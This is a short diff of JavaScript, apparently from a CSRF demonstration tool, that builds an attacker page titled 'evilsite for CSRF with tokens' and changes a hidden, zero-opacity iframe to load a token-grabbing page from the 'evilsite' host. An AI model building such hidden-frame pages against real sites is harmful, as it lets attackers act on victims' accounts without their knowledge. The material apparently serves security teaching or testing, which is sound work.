@@ -464,7 +464,7 @@ str += '</head>';
 str += '<body background="http://www.bubblews.com/assets/images/news/1398471793_1362220962.jpg">';
 str += '<h1><font color="white"><center>Welcome to evilsite for CSRF with tokens.com</center></h1>';
 str += '<p><font color="red"><center>Wait for 5 seconds for the magic to happen</center></font></p>';
-str += '<iframe src="http://'+evilsite+'/csrfwithtok.html" style="position: relative;opacity: 0;"></iframe>';
+str += '<iframe src="http://'+evilsite+'/gettokpage" style="position: relative;opacity: 0;"></iframe>';
 str += '</body>';
 str += '</html>';
 
